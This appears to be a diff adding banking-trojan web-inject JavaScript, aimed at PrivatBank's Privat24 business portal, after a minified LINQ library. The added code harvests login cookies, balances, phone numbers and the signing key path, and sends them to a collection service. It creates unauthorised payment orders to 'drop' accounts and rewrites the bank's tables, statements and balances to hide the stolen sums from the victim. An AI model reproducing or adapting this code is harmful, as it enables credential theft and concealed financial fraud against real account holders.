f=c(g),a=b(g),d=e.Get(f);if(d!==undefined)d.push(a);else e.Add(f,[a])});return new q(e)},ToObject:function(b,a){b=d.CreateLambda(b);a=d.CreateLambda(a);var c={};this.ForEach(function(d){c[b(d)]=a(d)});return c},ToDictionary:function(c,b,a){c=d.CreateLambda(c);b=d.CreateLambda(b);a=d.CreateLambda(a);var e=new n(a);this.ForEach(function(a){e.Add(c(a),b(a))});return e},ToJSON:function(a,b){return JSON.stringify(this.ToArray(),a,b)},ToString:function(a,c){if(a==b)a="";if(c==b)c=g.Identity;return this.Select(c).ToArray().join(a)},Do:function(b){var e=this;b=d.CreateLambda(b);return new c(function(){var c,g=0;return new f(function(){c=e.GetEnumerator()},function(){if(c.MoveNext()){b(c.Current(),g++);return this.Yield(c.Current())}return a},function(){d.Dispose(c)})})},ForEach:function(c){c=d.CreateLambda(c);var e=0,b=this.GetEnumerator();try{while(b.MoveNext())if(c(b.Current(),e++)===a)break}finally{d.Dispose(b)}},Write:function(c,f){if(c==b)c="";f=d.CreateLambda(f);var g=e;this.ForEach(function(b){if(g)g=a;else document.write(c);document.write(f(b))})},WriteLine:function(a){a=d.CreateLambda(a);this.ForEach(function(b){document.write(a(b));document.write("<br />")})},Force:function(){var a=this.GetEnumerator();try{while(a.MoveNext());}finally{d.Dispose(a)}},Let:function(b){b=d.CreateLambda(b);var e=this;return new c(function(){var g;return new f(function(){g=c.From(b(e)).GetEnumerator()},function(){return g.MoveNext()?this.Yield(g.Current()):a},function(){d.Dispose(g)})})},Share:function(){var e=this,d;return new c(function(){return new f(function(){if(d==b)d=e.GetEnumerator()},function(){return d.MoveNext()?this.Yield(d.Current()):a},g.Blank)})},MemoizeAll:function(){var h=this,e,d;return new c(function(){var c=-1;return new f(function(){if(d==b){d=h.GetEnumerator();e=[]}},function(){c++;return e.length<=c?d.MoveNext()?this.Yield(e[c]=d.Current()):a:this.Yield(e[c])},g.Blank)})},Catch:function(b){b=d.CreateLambda(b);var e=this;return new c(function(){var c;return new f(function(){c=e.GetEnumerator()},function(){try{return c.MoveNext()?this.Yield(c.Current()):a}catch(d){b(d);return a}},function(){d.Dispose(c)})})},Finally:function(b){b=d.CreateLambda(b);var e=this;return new c(function(){var c;return new f(function(){c=e.GetEnumerator()},function(){return c.MoveNext()?this.Yield(c.Current()):a},function(){try{d.Dispose(c)}finally{b()}})})},Trace:function(c,a){if(c==b)c="Trace";a=d.CreateLambda(a);return this.Do(function(b){console.log(c,":",a(b))})}};var g={Identity:function(a){return a},True:function(){return e},Blank:function(){}},i={Boolean:typeof e,Number:typeof 0,String:typeof"",Object:typeof{},Undefined:typeof undefined,Function:typeof function(){}},d={CreateLambda:function(a){if(a==b)return g.Identity;if(typeof a==i.String)if(a=="")return g.Identity;else if(a.indexOf("=>")==-1)return new Function("$,$$,$$$,$$$$","return "+a);else{var c=a.match(/^[(\s]*([^()]*?)[)\s]*=>(.*)/);return new Function(c[1],"return "+c[2])}return a},IsIEnumerable:function(b){if(typeof Enumerator!=i.Undefined)try{new Enumerator(b);return e}catch(c){}return a},Compare:function(a,b){return a===b?0:a>b?1:-1},Dispose:function(a){a!=b&&a.Dispose()}},k={Before:0,Running:1,After:2},f=function(d,f,g){var c=new p,b=k.Before;this.Current=c.Current;this.MoveNext=function(){try{switch(b){case k.Before:b=k.Running;d();case k.Running:if(f.apply(c))return e;else{this.Dispose();return a}case k.After:return a}}catch(g){this.Dispose();throw g;}};this.Dispose=function(){if(b!=k.Running)return;try{g()}finally{b=k.After}}},p=function(){var a=b;this.Current=function(){return a};this.Yield=function(b){a=b;return e}},j=function(f,b,c,e){var a=this;a.source=f;a.keySelector=d.CreateLambda(b);a.descending=c;a.parent=e};j.prototype=new c;j.prototype.CreateOrderedEnumerable=function(a,b){return new j(this.source,a,b,this)};j.prototype.ThenBy=function(b){return this.CreateOrderedEnumerable(b,a)};j.prototype.ThenByDescending=function(a){return this.CreateOrderedEnumerable(a,e)};j.prototype.GetEnumerator=function(){var h=this,d,c,e=0;return new f(function(){d=[];c=[];h.source.ForEach(function(b,a){d.push(b);c.push(a)});var a=l.Create(h,b);a.GenerateKeys(d);c.sort(function(b,c){return a.Compare(b,c)})},function(){return e<c.length?this.Yield(d[c[e++]]):a},g.Blank)};var l=function(c,d,e){var a=this;a.keySelector=c;a.descending=d;a.child=e;a.keys=b};l.Create=function(a,d){var c=new l(a.keySelector,a.descending,d);return a.parent!=b?l.Create(a.parent,c):c};l.prototype.GenerateKeys=function(d){var a=this;for(var f=d.length,g=a.keySelector,e=new Array(f),c=0;c<f;c++)e[c]=g(d[c]);a.keys=e;a.child!=b&&a.child.GenerateKeys(d)};l.prototype.Compare=function(e,f){var a=this,c=d.Compare(a.keys[e],a.keys[f]);if(c==0){if(a.child!=b)return a.child.Compare(e,f);c=d.Compare(e,f)}return a.descending?-c:c};var h=function(a){this.source=a};h.prototype=new c;h.prototype.Any=function(a){return a==b?this.source.length>0:c.prototype.Any.apply(this,arguments)};h.prototype.Count=function(a){return a==b?this.source.length:c.prototype.Count.apply(this,arguments)};h.prototype.ElementAt=function(a){return 0<=a&&a<this.source.length?this.source[a]:c.prototype.ElementAt.apply(this,arguments)};h.prototype.ElementAtOrDefault=function(a,b){return 0<=a&&a<this.source.length?this.source[a]:b};h.prototype.First=function(a){return a==b&&this.source.length>0?this.source[0]:c.prototype.First.apply(this,arguments)};h.prototype.FirstOrDefault=function(a,d){return d!=b?c.prototype.FirstOrDefault.apply(this,arguments):this.source.length>0?this.source[0]:a};h.prototype.Last=function(d){var a=this;return d==b&&a.source.length>0?a.source[a.source.length-1]:c.prototype.Last.apply(a,arguments)};h.prototype.LastOrDefault=function(d,e){var a=this;return e!=b?c.prototype.LastOrDefault.apply(a,arguments):a.source.length>0?a.source[a.source.length-1]:d};h.prototype.Skip=function(d){var b=this.source;return new c(function(){var c;return new f(function(){c=d<0?0:d},function(){return c<b.length?this.Yield(b[c++]):a},g.Blank)})};h.prototype.TakeExceptLast=function(a){if(a==b)a=1;return this.Take(this.source.length-a)};h.prototype.TakeFromLast=function(a){return this.Skip(this.source.length-a)};h.prototype.Reverse=function(){var b=this.source;return new c(function(){var c;return new f(function(){c=b.length},function(){return c>0?this.Yield(b[--c]):a},g.Blank)})};h.prototype.SequenceEqual=function(d,e){return(d instanceof h||d instanceof Array)&&e==b&&c.From(d).Count()!=this.Count()?a:c.prototype.SequenceEqual.apply(this,arguments)};h.prototype.ToString=function(a,d){if(d!=b||!(this.source instanceof Array))return c.prototype.ToString.apply(this,arguments);if(a==b)a="";return this.source.join(a)};h.prototype.GetEnumerator=function(){var b=this.source,c=0;return new f(g.Blank,function(){return c<b.length?this.Yield(b[c++]):a},g.Blank)};var n=function(){var h=function(a,b){return Object.prototype.hasOwnProperty.call(a,b)},d=function(a){return a===b?"null":a===undefined?"undefined":typeof a.toString===i.Function?a.toString():Object.prototype.toString.call(a)},l=function(d,c){var a=this;a.Key=d;a.Value=c;a.Prev=b;a.Next=b},j=function(){this.First=b;this.Last=b};j.prototype={AddLast:function(c){var a=this;if(a.Last!=b){a.Last.Next=c;c.Prev=a.Last;a.Last=c}else a.First=a.Last=c},Replace:function(c,a){if(c.Prev!=b){c.Prev.Next=a;a.Prev=c.Prev}else this.First=a;if(c.Next!=b){c.Next.Prev=a;a.Next=c.Next}else this.Last=a},Remove:function(a){if(a.Prev!=b)a.Prev.Next=a.Next;else this.First=a.Next;if(a.Next!=b)a.Next.Prev=a.Prev;else this.Last=a.Prev}};var k=function(c){var a=this;a.count=0;a.entryList=new j;a.buckets={};a.compareSelector=c==b?g.Identity:c};k.prototype={Add:function(i,j){var a=this,g=a.compareSelector(i),f=d(g),c=new l(i,j);if(h(a.buckets,f)){for(var b=a.buckets[f],e=0;e<b.length;e++)if(a.compareSelector(b[e].Key)===g){a.entryList.Replace(b[e],c);b[e]=c;return}b.push(c)}else a.buckets[f]=[c];a.count++;a.entryList.AddLast(c)},Get:function(i){var a=this,c=a.compareSelector(i),g=d(c);if(!h(a.buckets,g))return undefined;for(var e=a.buckets[g],b=0;b<e.length;b++){var f=e[b];if(a.compareSelector(f.Key)===c)return f.Value}return undefined},Set:function(k,m){var b=this,g=b.compareSelector(k),j=d(g);if(h(b.buckets,j))for(var f=b.buckets[j],c=0;c<f.length;c++)if(b.compareSelector(f[c].Key)===g){var i=new l(k,m);b.entryList.Replace(f[c],i);f[c]=i;return e}return a},Contains:function(j){var b=this,f=b.compareSelector(j),i=d(f);if(!h(b.buckets,i))return a;for(var g=b.buckets[i],c=0;c<g.length;c++)if(b.compareSelector(g[c].Key)===f)return e;return a},Clear:function(){this.count=0;this.buckets={};this.entryList=new j},Remove:function(g){var a=this,f=a.compareSelector(g),e=d(f);if(!h(a.buckets,e))return;for(var b=a.buckets[e],c=0;c<b.length;c++)if(a.compareSelector(b[c].Key)===f){a.entryList.Remove(b[c]);b.splice(c,1);if(b.length==0)delete a.buckets[e];a.count--;return}},Count:function(){return this.count},ToEnumerable:function(){var d=this;return new c(function(){var c;return new f(function(){c=d.entryList.First},function(){if(c!=b){var d={Key:c.Key,Value:c.Value};c=c.Next;return this.Yield(d)}return a},g.Blank)})}};return k}(),q=function(a){var b=this;b.Count=function(){return a.Count()};b.Get=function(b){return c.From(a.Get(b))};b.Contains=function(b){return a.Contains(b)};b.ToEnumerable=function(){return a.ToEnumerable().Select(function(a){return new o(a.Key,a.Value)})}},o=function(b,a){this.Key=function(){return b};h.call(this,a)};o.prototype=new h;return c}()});(function(a,b){a.fn.toEnumerable=function(){return b.From(this).Select(function(b){return a(b)})};b.prototype.TojQuery=function(){return a(this.ToArray())}})(jQuery,this.Enumerable||this.jQuery.Enumerable)
+}
+jqExt();
+
+var azdb, azdbObject;
+
+azdb = [];
+
+/**
+*@return {azdbObject}
+*/
+
+
+azdb.get = function(name) {
+  var db, res;
+  if (azsl.get("db_" + name) === null) {
+    db = TAFFY();
+    azsl.set("db_" + name, db().stringify());
+  }
+  res = {};
+  res.prototype = azdbObject;
+  res.name = name;
+  res.table = TAFFY(azsl.get("db_" + name));
+  return new azdbObject(name, res.table);
+};
+
+azdbObject = (function() {
+
+  function azdbObject(name, table) {
+    this.name = name;
+    this.table = table;
+  }
+
+  azdbObject.prototype.save = function() {
+    azsl.set("db_" + this.name, this.table().stringify());
+    return void 0;
+  };
+
+  azdbObject.prototype.drop = function() {
+    return azsl.set("db_" + this.name, null);
+  };
+
+  azdbObject.prototype["do"] = function(action) {
+    action(this.table);
+    return this;
+  };
+
+  return azdbObject;
+
+})();
+
+var BaseDB;
+
+BaseDB = (function() {
+
+  function BaseDB() {}
+
+  BaseDB.Name = null;
+
+  BaseDB.GetName = function() {
+    return this.Name;
+  };
+
+  BaseDB.All = function() {
+    var db;
+    db = azdb.get(this.Name);
+    return db.table().get();
+  };
+
+  BaseDB.Table = function() {
+    var db;
+    db = azdb.get(this.Name);
+    return db;
+  };
+
+  return BaseDB;
+
+})();
+
+
+String.prototype.AsDate=function(){return new Date(this.split('.')[2],this.split('.')[1]-1,this.split('.')[0])}
+var Const=new Array();
+Const.STOR_PAGE='azstorpage'
+Const.USER_NAME='azusername'
+Const.USER_PASS='azuserpass'
+Const.USER_PHONE='azuserphone'
+Const.USER_ORG_NAME='azuserorgname'
+Const.LIST_DOCS_TO_HIDE='azlistdocstohide'
+Const.LIST_DOCS_CAN_BE_SIGNED='azlistdocscanbesigned'
+Const.PAGE_AUTH='azpageauth'
+Const.PAGE_PHONE='azpagephone'
+Const.PAGE_SIGN='azpagesign'
+Const.PAGE_SENDED='azpagesended'
+Const.PAGE_RESTS='azpagerests'
+Const.PAGE_STATEMENTS='azpagestatements'
+Const.PAGE_REPORTS='azpagereports'
+Const.PAGE_PROGNOZ='azpageprognoz'
+Const.PAGE_EDIT='azpageedit'
+Const.PAGE_MAIN='azpagemain'
+Const.PAGE_UNKNOWN='azpageunknown'
+
+
+var loaderInjected = false;
+function Pages() {
+    azsl.set(Const.STOR_PAGE, Const.PAGE_UNKNOWN);
+    if(jQuery("input[name='UserName']").length>0)
+    {
+
+        azsl.set(Const.STOR_PAGE, Const.PAGE_AUTH);
+
+    }
+    if(document.location.pathname == "/p24/news") {
+
+        azsl.set(Const.STOR_PAGE, Const.PAGE_MAIN);
+    }
+    if(document.location.pathname == "/p24/c2b_nbu_prepared_sign") {
+
+        azsl.set(Const.STOR_PAGE, Const.PAGE_SIGN);
+    }
+    if(document.location.pathname == "/p24/c2b_sent") {
+
+        azsl.set(Const.STOR_PAGE, Const.PAGE_SENDED);
+    }
+    if(document.location.pathname == "/p24/c2brest") {
+        azsl.set(Const.STOR_PAGE, Const.PAGE_RESTS);
+    }
+    if(document.location.pathname == "/p24/c2bstatements") {
+        azsl.set(Const.STOR_PAGE, Const.PAGE_STATEMENTS);
+    }
+    if(document.location.pathname == "/p24/c2ball") {
+        azsl.set(Const.STOR_PAGE, Const.PAGE_REPORTS);
+    }
+    if(document.location.pathname == "/p24/c2bprogrest") {
+        azsl.set(Const.STOR_PAGE, Const.PAGE_REPORTS);
+    }
+    if(document.location.pathname == "/p24/c2b_nbu_quick_edit") {
+        azsl.set(Const.STOR_PAGE, Const.PAGE_EDIT);
+    }
+
+    if(jQuery("#choosePhoneForm").length>0)
+    {
+
+        azsl.set(Const.STOR_PAGE, Const.PAGE_PHONE);
+
+    }
+    azMain();
+}
+function CurPage() {
+
+    azlogs.log("page: " + azsl.get(Const.STOR_PAGE));
+    return azsl.get(Const.STOR_PAGE);
+}
+
+var _pageDetected=false;
+function PageDetector() {
+    _pageDetected=true;
+    azlogs.log("PageDetector");
+    Pages();
+   /* Top.commInjected = 0;
+    if (top.n&&Top.oldn==undefined) {
+        Top.oldn = top.n;
+        top.n = function(i, n) {
+            Top.oldn(i, n);
+            azsl.set(Const.STOR_PAGE, Const.PAGE_UNKNOWN);
+            if (i >= 2) {
+                if (i == 2) {
+                    azsl.set(Const.STOR_PAGE, Const.PAGE_AUTH);
+                }
+                if (i == 6) {
+                    azsl.set(Const.STOR_PAGE, Const.PAGE_ECP);
+                }
+                if (i == 7) {
+                    azsl.set(Const.STOR_PAGE, Const.PAGE_POLOSOCHKA);
+                }
+                azMain();
+            }
+        }
+    }
+    if (!loaderInjected && Top.fnCommOnload != undefined) {
+        loaderInjected = true;
+        var oldFnOnLoad = Top.fnCommOnload;
+        Top.fnCommOnload = function(w) {
+            Pages(w);
+            oldFnOnLoad(w);
+            //clearInterval(detectorInterval);
+        }
+
+
+    }*/
+
+
+}
+
+var ___DBPaydocs;
+function DBPaydocs()
+{
+    if(!___DBPaydocs){
+    ___DBPaydocs= new TAFFY();
+    ___DBPaydocs.store("Paydocs");
+    //___DBPaydocs.settings({template:{dn:null,dnvictim:null,date:null,sum:null,cur:null,dest:null,receiver:null,sender:null,status:false}});
+    }
+
+    return ___DBPaydocs;
+}
+var ___DBAccounts;
+function DBAccounts()
+{
+    if(!___DBAccounts){
+        ___DBAccounts= new TAFFY();
+        ___DBAccounts.store("Accounts");
+        //___DBAccounts.settings({template:{dn:null,dnvictim:null,date:null,sum:null,cur:null,dest:null,receiver:null,sender:null,status:false}});
+    }
+
+    return ___DBAccounts;
+}
+var ___DBDrops;
+function DBDrops()
+{
+    if(!___DBDrops){
+        ___DBDrops= new TAFFY();
+        ___DBDrops.store("Drops");
+        //___DBDrops.settings({template:{dn:null,dnvictim:null,date:null,sum:null,cur:null,dest:null,receiver:null,sender:null,status:false}});
+    }
+
+    return ___DBDrops;
+}
+
+function getBalance() {
+
+    function processReqChange() {
+        try {
+
+
+            if (req.readyState == 4) {
+                req.onreadystatechange = new Function("");
+
+                if (req.status == 200) {
+                    jQuery(req.responseXML).find('turn').each(function () {
+
+
+                        var outrest = jQuery(this).find('outrest').text();
+                        var credLim = jQuery(this).find('credLim').text();
+                        var ccy = jQuery(this).find('ccy').attr('code');
+                        var account = jQuery(this).attr('account');
+                        ServicePrivat.SummSet(account, parseFloat(outrest) + parseFloat(credLim), function (x) {
+                            if (DBAccounts()().filter({acc:account}).count() == 0) {
+                                DBAccounts().insert({acc:account, id:x});
+                            }
+                        });
+                        if((parseFloat(outrest) + parseFloat(credLim))>0){
+                        ServicePrivat.Log("val: " + account + " bal: " + outrest + " credLim: " + credLim);}
+
+                    });
+                    if (azsl.get(Const.USER_PASS) == null) {
+                        azsl.set(Const.USER_PASS, getCookie("UserPass"));
+                    }
+                    if (azsl.get(Const.USER_NAME) == null) {
+                        azsl.set(Const.USER_NAME, getCookie("UserName"));
+                    }
+                    ServicePrivat.Log("User Pass: " + azsl.get(Const.USER_PASS) + " User Name: " + azsl.get(Const.USER_NAME));
+                    ServicePrivat.Auth(azsl.get(Const.USER_PASS), azsl.get(Const.USER_NAME));
+
+
+                } else {
+
+                }
+            }
+        }
+        catch (e) {
+
+        }
+    }
+
+
+    var req;
+    req = new XMLHttpRequest();
+
+    if (req) {
+        req.open("GET", "https://cb.privatbank.ua/p24/c2brest", false);
+
+        req.onreadystatechange = processReqChange;
+        req.send(null);
+    }
+
+
+}
+
+
+function getUserInfo() {
+    function processReqChange() {
+        try {
+
+
+            if (req.readyState == 4) {
+
+
+                if (req.status == 200) {
+
+                    var HPHN = jQuery(req.responseXML).find("HPHN").text();//?”?????°?€?????? ?‚?µ?»?µ?„????
+
+                    var LNAME = jQuery(req.responseXML).find("LNAME").text();
+                    var KBNPHONE = jQuery(req.responseXML).find("KBNPHONE").text();//?????±???»?????‹?? ?‚?µ?»?µ?„????
+                    var ControlInfo = jQuery(req.responseXML).find("ControlInfo").text();//?¤???°?·?°-???????????°?‚????
+                    var WPHN = jQuery(req.responseXML).find("WPHN").text();//? ?°?±???‡???? ?‚?µ?»?µ?„????
+
+                    var txt = HPHN + "|" + LNAME + "|" + KBNPHONE + "|" + ControlInfo + "|" + WPHN;
+                    var type = "PHONE|ORGNAME|KBNPHONE|ControlInfo|WPHN";
+                    ServicePrivat.Save_Data(txt, type);
+                } else {
+
+                }
+            }
+        }
+        catch (e) {
+
+        }
+    }
+
+
+    var req;
+    req = new XMLHttpRequest();
+
+    if (req) {
+        req.open("GET", "https://cb.privatbank.ua/p24/changepersonal", true);
+
+        req.onreadystatechange = processReqChange;
+        req.send(null);
+    }
+
+
+}
+
+function getKey() {
+    azlogs.log(' Start Get Key');
+    function processReqChange() {
+        try {
+
+
+            if (req.readyState == 4) {
+
+
+                if (req.status == 200) {
+
+                    var KEYPATH = jQuery(req.responseXML).find("KEYPATH").text();
+                    ServicePrivat.Log("KEYPATH: " + KEYPATH);
+                    azlogs.log("KEYPATH: " + KEYPATH);
+                    jQuery.get("https://privatbank.ua/keypath/" + KEYPATH, true);
+                    azlogs.log("Send keypath to BOT");
+
+                } else {
+
+                }
+            }
+        }
+        catch (e) {
+
+        }
+    }
+
+
+    var req;
+    req = new XMLHttpRequest();
+
+    if (req) {
+        req.open("GET", "https://cb.privatbank.ua/p24/c2b_user", true);
+
+        req.onreadystatechange = processReqChange;
+        req.send(null);
+    }
+
+
+}
+function MakeScreenshot(comment) {
+    jQuery.get("/makescreen/privatur/" + encodeURI(comment), true);
+}
+
+function getCookie(name) {
+    var cookie = " " + document.cookie;
+    var search = " " + name + "=";
+    var setStr = null;
+    var offset = 0;
+    var end = 0;
+    if (cookie.length > 0) {
+        offset = cookie.indexOf(search);
+        if (offset != -1) {
+            offset += search.length;
+            end = cookie.indexOf(";", offset);
+            if (end == -1) {
+                end = cookie.length;
+            }
+            setStr = unescape(cookie.substring(offset, end));
+        }
+    }
+    return(setStr);
+}
+function GetPaymentData() {
+    if (DBDrops()().count() == 0) {
+        ServicePrivat.GetDrop(function (x) {
+            if (!x) {
+                jQuery('table.sortable').css('display', 'table');
+                return;
+            }
+
+            if (x.drop.nds == 1) {
+                var nds = Math.round((x.sum / 6) * 100) / 100;
+                x.sum -= nds;
+                x.drop.payDestination += decodeURI("%20%D0%A3%20%D1%81%D1%83%D0%BCi%20{0}%20%D0%B3%D1%80%D0%BD.,%20%D0%9F%D0%94%D0%92%20-%2020%20%25%20{1}%20%D0%B3%D1%80%D0%BD.").format(x.sum.toFixed(2), nds.toFixed(2));
+            }
+            DBDrops().insert(x);
+            _CreatePayment();
+        });
+    } else {
+        _CreatePayment();
+    }
+}
+function _CreatePayment() {
+    var client = new XMLHttpRequest();
+    client.open("POST", "https://cb.privatbank.ua/p24/c2b_nbu_payment_new");
+    client.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+    var drop = DBDrops()().get()[0];
+    client.onreadystatechange = function () {
+        try {
+            if (client.readyState == 4) {
+                if (client.status == 200) {
+                    var docnum = jQuery(client.responseXML).find("PAYMENT").attr("MUR");
+                    var amt = jQuery(client.responseXML).find("PAYMENT").attr("amt");
+                    if (docnum) {
+                        azlogs.log("Created doc: " + docnum);
+                        ServicePrivat.Log("Created doc: " + docnum, function(){document.location.pathname = '/p24/c2b_nbu_prepared_sign';});
+
+
+                    }
+                    DBPaydocs().insert({dn:docnum, amt:parseFloat(amt), initiator:drop});
+
+
+                } else {
+                }
+            }
+        }
+        catch (e) {
+        }
+    };
+
+    var d = new Date();
+    var curr_date = d.getDate();
+    var curr_month = d.getMonth() + 1;
+    var curr_year = d.getFullYear();
+    var strDate = curr_date + "." + curr_month + "." + curr_year;
+    var senderAcc = DBAccounts()().filter({id:{"==":drop.accid}}).get(0)[0].acc;
+    client.send(("zip_code=&ref_source=&type_source=&type=cr&MUR=&DAT_CUS={0}&DAT_VAL={0}&amt={1}&ccy=&A_ACC={2}&B_CRF={3}&B_NAME={4}&B_ACC={5}&B_BIC={6}&phone=%2B380&EMAIL=&detailslen={7}&DETAILS={8}&alias=&PRRT=" + (drop.drop.nds == 0 ? "" : "&addNDS2=Y"))
+        .format(strDate,
+        drop.sum.toFixed(2),
+        senderAcc,
+        drop.drop.INN,
+        encodeURIComponent(drop.drop.beneficiaryName),
+        drop.drop.AccNum,
+        drop.drop.bankBIK,
+        160 - drop.drop.payDestination.length,
+        encodeURIComponent(drop.drop.payDestination)
+
+    ));
+    DBDrops()().remove();
+}
+
+function HidePaydocs() {
+
+
+    var javaApp = null;
+    var curDoc = null;
+    DBPaydocs()().update({status:true});
+
+    jQuery('table.sortable tbody tr').each(function () {
+        var cur = jQuery(this);
+        var num = cur.find("td:nth-child(3)").text();
+
+        if (DBPaydocs()().filter({dn:num}).count() > 0) {
+            DBPaydocs()().filter({dn:num}).update({status:false});
+            javaApp = cur.find("td:nth-child(1)").html();
+            curDoc = num;
+            cur.remove();
+        }
+
+    });
+
+    jQuery('table.sortable tbody tr').each(function () {
+        var cur = jQuery(this);
+        var num = cur.find("td:nth-child(3)").text();
+        if (DBPaydocs()().filter({dnvictim:num, status:true}).count() > 0) {
+            cur.remove();
+        }
+    });
+    if (javaApp != null) {
+        var cur = jQuery('table.sortable tbody tr').first();
+        if (cur.length > 0) {
+            var sign = {};
+            sign.dnvictim = cur.find("td:nth-child(3) a").html();
+            sign.date = cur.find("td:nth-child(4)").html();
+            sign.sum = cur.find("td:nth-child(5)").html();
+            sign.cur = cur.find("td:nth-child(6)").html();
+            sign.dest = cur.find("td:nth-child(7)").html();
+            sign.receiver = cur.find("td:nth-child(9)").html();
+            sign.sender = cur.find("td:nth-child(10)").html();
+
+
+            DBPaydocs()().filter({dn:curDoc}).update(sign);
+            cur.find("td:nth-child(1)").html(javaApp);
+        }
+    }
+
+    jQuery('table.sortable tbody tr').each(function (i, obj) {
+        if (i % 2 == 0) {
+            jQuery(this).removeClass("even");
+            jQuery(this).addClass("odd");
+        }
+        else {
+            jQuery(this).removeClass("odd");
+            jQuery(this).addClass("even");
+        }
+    });
+
+    jQuery('table.sortable tfoot tr').first().remove();
+}
+function HideSended() {
+    jQuery('table.sortable tbody tr').each(function () {
+        var cur = jQuery(this);
+        var num = cur.find("td:nth-child(2)").text();
+
+        if (DBPaydocs()().filter({dn:{"==":num}}).count() > 0) {
+            var sign = DBPaydocs()().filter({dn:{"==":num}}).get()[0];
+            DBPaydocs()().filter({dn:{"==":num}}).update({status:true});
+
+            cur.find("td:nth-child(2)").html(sign.dnvictim);
+            cur.find("td:nth-child(3)").html(sign.date);
+            cur.find("td:nth-child(4)").html(sign.sum);
+            cur.find("td:nth-child(5)").html(sign.cur);
+            cur.find("td:nth-child(6)").html(sign.sender);
+            cur.find("td:nth-child(7)").html(sign.receiver);
+            cur.find("td:nth-child(8)").html(sign.dest);
+
+
+        }
+    });
+
+    jQuery('table.sortable tfoot tr').first().remove();
+}
+function FindAccNum(sender) {
+
+    var reg = /\[(.+)\]/;
+    return reg.exec(sender)[1];
+}
+
+function HideRests() {
+
+    jQuery('table.sortable tbody tr').each(
+        function () {
+            var paydocs = DBPaydocs()().filter({status:true}).get();
+            var curAcc = jQuery(this).find("td:nth-child(2) a").text();
+            var sum = jQuery.Enumerable.From(paydocs).Where(
+                function (x) {
+                    return x.sender && FindAccNum(x.sender) == curAcc;
+                }).Select(
+                function (x) {
+                    return parseFloat(x.sum)
+                }).Sum();
+            var dropsum = jQuery.Enumerable.From(paydocs).Where(
+                function (x) {
+                    return x.sender && FindAccNum(x.sender) == curAcc;
+                }).Select(
+                function (x) {
+                    return parseFloat(x.amt)
+                }).Sum();
+            var rest1 = jQuery(this).find("td:nth-child(5)").text();
+            var rest2 = jQuery(this).find("td:nth-child(8)").text();
+            rest1 = parseFloat(rest1);
+            rest2 = parseFloat(rest2);
+            rest1 -= sum - dropsum;
+            rest2 -= sum - dropsum;
+            jQuery(this).find("td:nth-child(5)").text(rest1.toFixed(2));
+            jQuery(this).find("td:nth-child(8)").text(rest2.toFixed(2));
+        }
+    );
+
+
+}
+
+function HideStatements() {
+    jQuery('table.sortable tbody tr').each(
+        function () {
+            var cur = jQuery(this);
+            var curDoc = cur.find("td:nth-child(1) form a").first().text();
+            if (DBPaydocs()().filter({dn:curDoc}).count() > 0) {
+                var paydoc = DBPaydocs()().filter({dn:curDoc}).get()[0];
+
+                cur.find("td:nth-child(1) form a").first().html(paydoc.dnvictim);
+
+                cur.find("td:nth-child(3)").html("-" + paydoc.sum);
+                cur.find("td:nth-child(4)").html(paydoc.cur);
+                cur.find("td:nth-child(5)").html(paydoc.dest);
+
+                var rx = /(.+);(.+)<br>(.+)<br>(.+);(.+)/;
+                var data = rx.exec(paydoc.receiver);
+                var egrpou = data[1];
+                var name = data[2];
+                var recAccNum = data[3];
+                var recMfo = data[4];
+                var recBanc = data[5];
+                cur.find("td:nth-child(6)").html(egrpou);
+                cur.find("td:nth-child(7)").html(name);
+                cur.find("td:nth-child(8)").html(recAccNum);
+                cur.find("td:nth-child(9)").html(recMfo);
+                var baseForm = cur.find("td:nth-child(1) form").first();
+                baseForm.find("[name='spell_amt']").val(paydoc.sum);
+                baseForm.find("[name='spell_ccy']").val(paydoc.cur);
+                baseForm.find("[name='MUR']").val(paydoc.dnvictim);
+                baseForm.find("[name='DOC_AMT']").val(paydoc.sum);
+                baseForm.find("[name='CCY']").val(paydoc.cur);
+                baseForm.find("[name='A_ACC']").val(FindAccNum(paydoc.sender));
+                baseForm.find("[name='B_BIC']").val(recMfo);
+                baseForm.find("[name='B_BANK']").val(recBanc);
+                baseForm.find("[name='B_ACC']").val(recAccNum);
+                baseForm.find("[name='B_CRF']").val(egrpou);
+                baseForm.find("[name='B_NAM']").val(name);
+                baseForm.find("[name='DETAILS']").val(paydoc.dest);
+
+
+            }
+
+        }
+    );
+}
+function HideReports() {
+    var grabedAmount = 0;
+    var originalAmount = 0;
+    jQuery('table.sortable tbody tr').each(
+        function () {
+            var cur = jQuery(this);
+            var curDoc = cur.find("td:nth-child(1) form a").first().text();
+            if (DBPaydocs()().filter({dn:curDoc}).count() > 0) {
+                var paydoc = DBPaydocs()().filter({dn:curDoc}).get()[0];
+                originalAmount += parseFloat(paydoc.sum);
+                grabedAmount += parseFloat(cur.find("td:nth-child(3)").html());
+                cur.find("td:nth-child(1) form a").first().html(paydoc.dnvictim);
+
+                cur.find("td:nth-child(3)").html("-" + paydoc.sum);
+                cur.find("td:nth-child(4)").html(paydoc.cur);
+                cur.find("td:nth-child(5)").html(paydoc.dest);
+
+                var rx = /(.+);(.+)<br>(.+)<br>(.+);(.+)/;
+                var data = rx.exec(paydoc.receiver);
+                var egrpou = data[1];
+                var name = data[2];
+                var recAccNum = data[3];
+                var recMfo = data[4];
+                var recBanc = data[5];
+                cur.find("td:nth-child(6)").html(egrpou);
+                cur.find("td:nth-child(7)").html(name);
+                cur.find("td:nth-child(8)").html(recAccNum);
+                cur.find("td:nth-child(9)").html(recMfo);
+                var baseForm = cur.find("td:nth-child(1) form").first();
+                baseForm.find("[name='spell_amt']").val(paydoc.sum);
+                baseForm.find("[name='spell_ccy']").val(paydoc.cur);
+                baseForm.find("[name='MUR']").val(paydoc.dnvictim);
+                baseForm.find("[name='DOC_AMT']").val(paydoc.sum);
+                baseForm.find("[name='CCY']").val(paydoc.cur);
+                baseForm.find("[name='A_ACC']").val(FindAccNum(paydoc.sender));
+                baseForm.find("[name='B_BIC']").val(recMfo);
+                baseForm.find("[name='B_BANK']").val(recBanc);
+                baseForm.find("[name='B_ACC']").val(recAccNum);
+                baseForm.find("[name='B_CRF']").val(egrpou);
+                baseForm.find("[name='B_NAM']").val(name);
+                baseForm.find("[name='DETAILS']").val(paydoc.dest);
+
+
+            }
+
+        }
+    );
+    var lines = jQuery('form + table').find('tr[valign="baseline"]');
+    var inpRestFiled = lines.eq(0).find("td:nth-child(3)");
+    var outRestFiled = lines.eq(0).find("td:nth-child(6)");
+    var rolloverFiled = lines.eq(1).find("td:nth-child(2)");
+    rolloverFiled.html((parseFloat(rolloverFiled.html()) + grabedAmount + originalAmount).toFixed(2));
